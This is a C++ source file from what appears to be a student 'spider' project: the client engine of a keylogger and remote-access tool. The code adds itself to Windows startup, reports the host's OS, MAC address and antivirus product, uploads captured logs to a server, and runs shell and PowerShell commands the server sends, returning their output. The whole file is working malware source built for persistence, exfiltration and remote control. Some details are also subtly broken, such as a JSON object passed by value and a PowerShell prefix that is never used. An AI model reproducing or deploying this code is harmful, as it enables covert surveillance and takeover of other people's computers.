/*
** Engine.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/Engine.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:11:54 2017 Gauthier Cler
** Last update Sun Oct 08 22:11:56 2017 Gauthier Cler
*/

#include <iostream>
#include <csignal>
#include "Engine.hpp"

void abortHandler(int signal) {
  std::cerr << "Error: Couldn't connect to server" << std::endl;
}

Client::Engine::Engine() : _running(true), _lastPing(std::chrono::system_clock::now()) {
  std::signal(SIGABRT, abortHandler);
  registerToStart();
}

void Client::Engine::run() {
  std::thread listenerThread(&Client::ListenerManager::run, &_listenerManager);

  _communicationManager.initialize();
  sendSysInfo();
  while (_running) {
    Client::Data::get().lockLogAccessor();
    if (isTimeToSend()) {
      _communicationManager.refreshConnection();
      _lastPing = std::chrono::system_clock::now();
      this->logData();
    }
    if (_communicationManager.hasCommand())
      handleCommands();
    Client::Data::get().unlockLogAccessor();
  }
  listenerThread.join();
}

void Client::Engine::logData() {
  try {
    if ((*_communicationManager.getStream(SERVER_NAME)).isAlive()) {
      std::cout << "Online Write" << std::endl;
      this->logOnline();
    } else {
      std::cout << "Offline Write" << std::endl;
      this->logOffline();
    }
  } catch (std::exception &e) {
    std::cout << "Got exception : " << e.what() << std::endl;
  }

}

void Client::Engine::logOnline() {
	std::string 		logs;

	if ((*_communicationManager.getStream(LOG_FILE)).hasData()) {
		try {
			logs.assign((*_communicationManager.getStream(LOG_FILE)).extractData());
		} catch (std::exception &e) {
			std::cout << "Extract error : " << e.what() << std::endl;
		}
	} else {
		logs.assign(Client::Data::get().extractLog());
	}
	if (!(*_communicationManager.getStream(SERVER_NAME)).write(logs)) {
		((*_communicationManager.getStream(LOG_FILE)).write(logs));
	}
}

void Client::Engine::logOffline() {
	(*_communicationManager.getStream(LOG_FILE)).write(Client::Data::get().extractLog());
}

void Client::Engine::sendSysInfo() {
  boost::property_tree::ptree 	json;
  std::ostringstream		jsonData;

  json.put("os", _sys.getVersion());
  json.put("mac", _sys.getMac());
  json.put("antivirus", _sys.getAntiVirus());
  boost::property_tree::json_parser::write_json(jsonData, json);
  _communicationManager.sendDataTo(SERVER_NAME, jsonData.str());
}

bool Client::Engine::isTimeToSend() const {
  return ((std::chrono::duration_cast<std::chrono::seconds>
	     (std::chrono::system_clock::now() - _lastPing).count() > PINGTIME));
}

void Client::Engine::registerToStart() {
  wchar_t szPathToExe[MAX_PATH];

  GetModuleFileNameW(nullptr, szPathToExe, MAX_PATH);
  _sys.registerToStartUp(L"MyProg", szPathToExe);
}

static void			fillCommandJSON(boost::property_tree::ptree json,
						   const std::string &cmd,
						   const std::string &out,
						   const std::string &err,
						   int errCode)
{
  json.put("type", "command");
  json.put("timestamp", std::chrono::duration_cast<std::chrono::milliseconds>(
    std::chrono::system_clock::now().time_since_epoch()).count());
  json.put("command", cmd);
  json.put("stdout", out);
  json.put("stderr", err);
  json.put("exitcode",errCode);
}

static int			execCMD(const std::string &cmd, std::string &data)
{
  char				buff[128];
  FILE				*shell;

  if ((shell = _popen(cmd.c_str(), "rt")) == NULL)
    return (1);
  while (fgets(buff, 128, shell))
    data.append(buff);
  if (feof(shell))
    return (0);
  else
    return (1);
}

static void			handleShell(const std::string &cmd, Client::CommunicationManager &cm)
{
  std::string			stout;
  int				ret = execCMD(cmd, stout);
  boost::property_tree::ptree	json;
  std::stringstream		out;

  fillCommandJSON(json, cmd, stout, " ", ret);
  boost::property_tree::json_parser::write_json(out, json);
  cm.sendDataTo(SERVER_NAME, out.str());
}

static void			handlePower(const std::string &cmd, Client::CommunicationManager &cm)
{
  std::string			powerShell("Powershell ");
  int				ret;
  boost::property_tree::ptree	json;
  std::string			stout;
  std::stringstream		out;

  std::cout << "PowerShell" << std::endl;
  powerShell.append(cmd);
  ret = execCMD(cmd, stout);
  fillCommandJSON(json, cmd, stout, " ", ret);
  boost::property_tree::json_parser::write_json(out, json);
  cm.sendDataTo(SERVER_NAME, out.str());
}

static const Client::Engine::CommandHandler hdl[] = {
  { "SHELL", handleShell },
  { "POWERSHELL", handlePower }
};

void Client::Engine::handleCommands() {
  boost::property_tree::ptree	json = _communicationManager.getCommand();
  const std::string		type = json.get<std::string>("type");

  for (auto &h : hdl)
    if (h.first == type)
      h.second(json.get<std::string>("data"), _communicationManager);
}